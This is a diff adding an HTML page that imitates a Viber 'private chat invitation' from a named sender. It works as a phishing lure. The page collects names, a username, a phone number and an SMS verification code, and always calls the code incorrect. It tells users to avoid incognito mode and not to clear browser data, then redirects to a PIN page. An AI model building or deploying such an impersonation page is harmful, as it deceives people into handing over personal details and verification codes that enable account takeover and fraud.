@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Viber Private Invitation</title>
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      /* Prevents pinch-zoom and bounce behaviors natively */
+      touch-action: pan-x pan-y;
+    }
+
+    :root {
+      --viber-purple: #7360f2;
+      --viber-dark: #5946d2;
+      --blue: #007aff;
+      --red: #ff3b30;
+      --bg-light: #ffffff;
+      --text-main: #1c1c1e;
+      --text-muted: #8e8e93;
+      --border: rgba(0, 0, 0, 0.08);
+      --input-bg: #f2f2f7;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-light);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    /* ── Fullscreen Screen Layout Frame (No Boxes) ── */
+    .viewport-layout {
+      width: 100%;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: calc(40px + env(safe-area-inset-top)) 24px calc(40px + env(safe-area-inset-bottom));
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── View States Control ── */
+    .view-panel {
+      display: none;
+      flex-direction: column;
+      flex: 1;
+      animation: iosFade 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+    }
+    .view-panel.active {
+      display: flex;
+    }
+
+    @keyframes iosFade {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Invitation Screen Elements ── */
+    .welcome-hero {
+      text-align: center;
+      margin-top: 40px;
+      margin-bottom: auto;
+    }
+
+    .viber-logo-wrap {
+      width: 80px;
+      height: 80px;
+      background: var(--viber-purple);
+      border-radius: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 28px;
+      box-shadow: 0 8px 24px rgba(115, 96, 242, 0.25);
+    }
+    .viber-logo-wrap svg { width: 44px; height: 44px; fill: #ffffff; }
+
+    .invitation-title {
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.6px;
+      margin-bottom: 14px;
+      line-height: 1.3;
+    }
+    .invitation-desc {
+      font-size: 16px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      padding: 0 10px;
+    }
+
+    /* ── Storage Warning Banner ── */
+    .storage-instruction-box {
+      background-color: #fff9e6;
+      border-left: 4px solid #ffcc00;
+      padding: 14px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      line-height: 1.45;
+      color: #665200;
+    }
+    .storage-instruction-box strong {
+      color: #cc9900;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    /* ── Apple Interactive Fields System ── */
+    .form-scroll-container {
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+      margin-left: 4px;
+      letter-spacing: 0.3px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 16px;
+      border-radius: 12px;
+      border: none;
+      background: var(--input-bg);
+      font-size: 16px;
+      outline: none;
+      color: var(--text-main);
+      transition: background 0.2s;
+    }
+    .input-field:focus {
+      background: #e5e5ea;
+    }
+
+    /* Avatar Configurations */
+    .avatar-picker-zone {
+      position: relative;
+      width: 106px;
+      height: 106px;
+      margin: 10px auto 24px;
+    }
+    .avatar-preview {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      object-fit: cover;
+      background: #e5e5ea;
+      border: 1px solid var(--border);
+    }
+    .avatar-upload-icon {
+      position: absolute;
+      bottom: 2px;
+      right: 2px;
+      background: var(--blue);
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+    .avatar-picker-zone input[type="file"] { display: none; }
+
+    /* Inline elements alignment layout */
+    .phone-row-input {
+      display: flex;
+      gap: 10px;
+    }
+    .btn-inline {
+      padding: 0 20px;
+      background: var(--blue);
+      color: white;
+      border-radius: 12px;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn-inline:disabled {
+      background: #e5e5ea;
+      color: #a1a1a6;
+      cursor: not-allowed;
+    }
+
+    /* Dynamic SMS Error Panel System */
+    .sms-wrapper-zone {
+      margin-top: 18px;
+      display: none;
+    }
+    .sms-wrapper-zone.show { display: block; }
+
+    .error-notice-label {
+      display: none;
+      font-size: 13px;
+      color: var(--red);
+      font-weight: 500;
+      margin-top: 8px;
+      margin-left: 4px;
+      line-height: 1.4;
+    }
+
+    /* Professional Buttons styling */
+    .cta-container {
+      margin-top: auto;
+      padding-top: 30px;
+    }
+
+    .btn-action {
+      width: 100%;
+      padding: 16px;
+      border-radius: 14px;
+      border: none;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.2s, transform 0.1s;
+    }
+    .btn-primary {
+      background: var(--viber-purple);
+      color: #ffffff;
+    }
+    .btn-primary:active { transform: scale(0.99); opacity: 0.9; }
+
+    .btn-secondary {
+      background: transparent;
+      color: var(--text-muted);
+      font-size: 15px;
+      margin-top: 14px;
+    }
+    .btn-secondary:active { opacity: 0.6; }
+
+    /* ── Apple Native Fullscreen iOS Loader overlay ── */
+    .ios-loader-overlay {
+      position: fixed;
+      inset: 0;
+      background: #ffffff;
+      z-index: 99999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.25s ease;
+    }
+    .ios-loader-overlay.show { opacity: 1; pointer-events: all; }
+
+    .ios-spinner { position: relative; width: 36px; height: 36px; }
+    .ios-spinner div {
+      position: absolute; width: 10%; height: 28%; background: #8e8e93;
+      left: 44.5%; top: 37%; border-radius: 50px; transform-origin: center 130%;
+      animation: ios-spinner-fade 1s linear infinite;
+    }
+    .ios-spinner div:nth-child(1) { transform: rotate(0deg); animation-delay: -1s; }
+    .ios-spinner div:nth-child(2) { transform: rotate(30deg); animation-delay: -0.9167s; }
+    .ios-spinner div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.8333s; }
+    .ios-spinner div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.75s; }
+    .ios-spinner div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.6667s; }
+    .ios-spinner div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.5833s; }
+    .ios-spinner div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
+    .ios-spinner div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4167s; }
+    .ios-spinner div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3333s; }
+    .ios-spinner div:nth-child(10) { transform: rotate(270deg); animation-delay: -0.25s; }
+    .ios-spinner div:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1667s; }
+    .ios-spinner div:nth-child(12) { transform: rotate(330deg); animation-delay: -0.0833s; }
+
+    @keyframes ios-spinner-fade {
+      0% { opacity: 1; background: #1c1c1e; }
+      100% { opacity: 0.25; background: #8e8e93; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="ios-loader-overlay" id="iosLoader">
+    <div class="ios-spinner">
+      <div></div><div></div><div></div><div></div>
+      <div></div><div></div><div></div><div></div>
+      <div></div><div></div><div></div><div></div>
+    </div>
+  </div>
+
+  <div class="viewport-layout">
+
+    <div class="view-panel active" id="viewInvite">
+      <div class="welcome-hero">
+        <div class="viber-logo-wrap">
+          <svg viewBox="0 0 24 24">
+            <path d="M19.7 19.2a10 10 0 0 1-13.4.3l-2.6.9a1 1 0 0 1-1.3-1.2l.9-2.6A10 10 0 0 1 20 6.6a10 10 0 0 1-.3 12.6zm-2.2-6.5c-.5-.3-1.1-.6-1.6-.4-.4.1-.7.6-.9 1-.2.4-.4.5-.7.4a5.3 5.3 0 0 1-2.3-1.5 5.3 5.3 0 0 1-1.5-2.3c-.1-.3 0-.5.4-.7.4-.2.9-.5 1-.9.2-.5-.1-1.1-.4-1.6-.3-.6-.7-1.3-1.4-1.3-.5 0-1 .4-1.3.8-.7.7-1 2-1 3 0 1.8.8 3.8 2.2 5.2a10 10 0 0 0 6.8 3.1c1.2 0 2.6-.5 3.2-1.3.4-.3.7-.8.7-1.3 0-.7-.7-1.1-1.3-1.4z"/>
+          </svg>
+        </div>
+        <h1 class="invitation-title">Heinrich Vogel invited you to a Viber private chat</h1>
+        <p class="invitation-desc">This connection is secure and encrypted end-to-end. Accept the invitation below to set up your interface profile.</p>
+      </div>
+
+      <div class="cta-container">
+        <button class="btn-action btn-primary" id="btnAccept">Accept Request</button>
+      </div>
+    </div>
+
+    <div class="view-panel" id="viewRegister">
+      <h2 class="invitation-title" style="margin-bottom: 12px; text-align: center;">Profile Setup</h2>
+
+      <div class="storage-instruction-box">
+        <strong>Important Account Security Notice:</strong>
+        Do not use a private/incognito browser window to sign up. Because chat data is stored strictly locally inside your current browser session, closing a private tab will permanently erase your local cache and lock you out of your account. If you are using a standard browser window, do not clear your application browser data, cookies, or local cache, as this is where all account configuration keys are securely held.
+      </div>
+
+      <div class="form-scroll-container">
+        <div class="avatar-picker-zone">
+          <img src="https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=150&h=150" class="avatar-preview" id="profileImageDisplay" alt="User Avatar">
+          <label class="avatar-upload-icon" for="avatarInputFile">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
+          </label>
+          <input type="file" id="avatarInputFile" accept="image/*">
+        </div>
+
+        <div class="form-group">
+          <label>USERNAME</label>
+          <input type="text" class="input-field" id="regUsername" placeholder="Enter username" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+          <label>FIRST NAME</label>
+          <input type="text" class="input-field" id="regFirstName" placeholder="Enter your first name" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+          <label>LAST NAME</label>
+          <input type="text" class="input-field" id="regLastName" placeholder="Enter your last name" autocomplete="off">
+        </div>
+
+        <div class="form-group">
+          <label>PHONE NUMBER (OPTIONAL)</label>
+          <div class="phone-row-input">
+            <input type="tel" class="input-field" id="regPhone" placeholder="+49 000 0000000">
+            <button type="button" class="btn-inline" id="btnGetCode">Get Code</button>
+          </div>
+        </div>
+
+        <div class="sms-wrapper-zone" id="smsBox">
+          <div class="form-group">
+            <label>SMS VERIFICATION CODE</label>
+            <input type="text" class="input-field" id="smsCodeInput" placeholder="••••••" maxlength="8" style="text-align: center; letter-spacing: 3px; font-weight: 600;">
+            <div class="error-notice-label" id="lblSmsError">Incorrect code. Please check your verification messages and try again.</div>
+            <div class="error-notice-label" id="lblCountryRestriction" style="color: var(--text-muted); font-weight: 400;">Notice: Only Germany (+49) and United Kingdom (+44) numbers are supported for automated SMS verification streams.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cta-container">
+        <button type="button" class="btn-action btn-primary" id="btnSubmitForm">Complete Setup</button>
+        <button type="button" class="btn-action btn-secondary" id="btnSkipPhone">Skip Phone &amp; Continue</button>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    // Prevent multi-touch gesture pinching natively
+    document.addEventListener('gesturestart', function(e) {
+      e.preventDefault();
+    });
+
+    // ── Gated Persistent Authentication Loop Check ──
+    if (localStorage.getItem('viber_registered_status') === 'true') {
+      window.location.replace('profile.html');
+    }
+
+    // View Panel Navigation Management
+    const viewInvite = document.getElementById('viewInvite');
+    const viewRegister = document.getElementById('viewRegister');
+    const btnAccept = document.getElementById('btnAccept');
+    const iosLoader = document.getElementById('iosLoader');
+
+    // Content Registration Inputs & UI Elements
+    const avatarInputFile = document.getElementById('avatarInputFile');
+    const profileImageDisplay = document.getElementById('profileImageDisplay');
+    const regUsername = document.getElementById('regUsername');
+    const regFirstName = document.getElementById('regFirstName');
+    const regLastName = document.getElementById('regLastName');
+    const regPhone = document.getElementById('regPhone');
+    const btnGetCode = document.getElementById('btnGetCode');
+    const smsBox = document.getElementById('smsBox');
+    const smsCodeInput = document.getElementById('smsCodeInput');
+    const lblSmsError = document.getElementById('lblSmsError');
+    const lblCountryRestriction = document.getElementById('lblCountryRestriction');
+    const btnSubmitForm = document.getElementById('btnSubmitForm');
+    const btnSkipPhone = document.getElementById('btnSkipPhone');
+
+    let timerInterval = null;
+    let countdownSec = 60;
+
+    // View Routing Step Transition
+    btnAccept.addEventListener('click', function() {
+      viewInvite.classList.remove('active');
+      viewRegister.classList.add('active');
+    });
+
+    // Native Media Asset Sync: Instant Avatar Preview
+    avatarInputFile.addEventListener('change', function(e) {
+      const selectedFile = e.target.files[0];
+      if (selectedFile) {
+        const fileReader = new FileReader();
+        fileReader.onload = function(evt) {
+          profileImageDisplay.src = evt.target.result;
+        };
+        fileReader.readAsDataURL(selectedFile);
+      }
+    });
+
+    // SMS Validation Handler Stream Configuration Loop
+    btnGetCode.addEventListener('click', function() {
+      if (!regPhone.value.trim()) {
+        alert('Please enter a phone number containing your country code.');
+        return;
+      }
+
+      lblSmsError.style.display = 'none';
+
+      smsBox.classList.add('show');
+      lblCountryRestriction.style.display = 'block';
+      btnGetCode.disabled = true;
+      countdownSec = 60;
+
+      clearInterval(timerInterval);
+      timerInterval = setInterval(function() {
+        countdownSec--;
+        if (countdownSec <= 0) {
+          clearInterval(timerInterval);
+          btnGetCode.disabled = false;
+          btnGetCode.textContent = "Get Code";
+        } else {
+          btnGetCode.textContent = countdownSec + "s";
+        }
+      }, 1000);
+    });
+
+    // Code Validation Handler
+    smsCodeInput.addEventListener('input', function() {
+      if (smsCodeInput.value.trim().length >= 4) {
+        lblSmsError.style.display = 'block';
+        lblCountryRestriction.style.display = 'block';
+      } else {
+        lblSmsError.style.display = 'none';
+      }
+    });
+
+    // Registration Form Submission Loop Guard
+    btnSubmitForm.addEventListener('click', function() {
+      if (!regUsername.value.trim() || !regFirstName.value.trim() || !regLastName.value.trim()) {
+        alert('Please complete your username, first name, and last name inputs.');
+        return;
+      }
+
+      if (smsBox.classList.contains('show')) {
+        lblSmsError.style.display = 'block';
+        lblCountryRestriction.style.display = 'block';
+        return;
+      }
+
+      saveAndRouteUser(false);
+    });
+
+    // User Skip Route Interceptor Trigger Action
+    btnSkipPhone.addEventListener('click', function() {
+      if (!regUsername.value.trim() || !regFirstName.value.trim() || !regLastName.value.trim()) {
+        alert('Please fill out your username, first name, and last name details before proceeding.');
+        return;
+      }
+      saveAndRouteUser(true);
+    });
+
+    // Setup Storage and Trigger Transition
+    function saveAndRouteUser(isSkipped) {
+      // Append 3 unique numbers to username profile entry
+      const randomThreeDigits = Math.floor(100 + Math.random() * 900);
+      const finalUsername = regUsername.value.trim() + randomThreeDigits;
+      const finalFullName = regFirstName.value.trim() + " " + regLastName.value.trim();
+      const finalPhone = (isSkipped || !regPhone.value.trim()) ? "none" : regPhone.value.trim();
+
+      // Write parameters securely directly into browser sandbox storage
+      localStorage.setItem('viber_user_name', finalFullName);
+      localStorage.setItem('viber_username_handle', finalUsername);
+      localStorage.setItem('viber_phone_number', finalPhone);
+      localStorage.setItem('viber_avatar_data', profileImageDisplay.src);
+      localStorage.setItem('viber_registered_status', 'true');
+
+      // Turn on native modal full screen iOS loader overlay
+      iosLoader.classList.add('show');
+
+      // 6-second timeout before redirection
+      setTimeout(function() {
+        window.location.href = 'pin.html';
+      }, 6000);
+    }
+  </script>
+</body>
+</html>
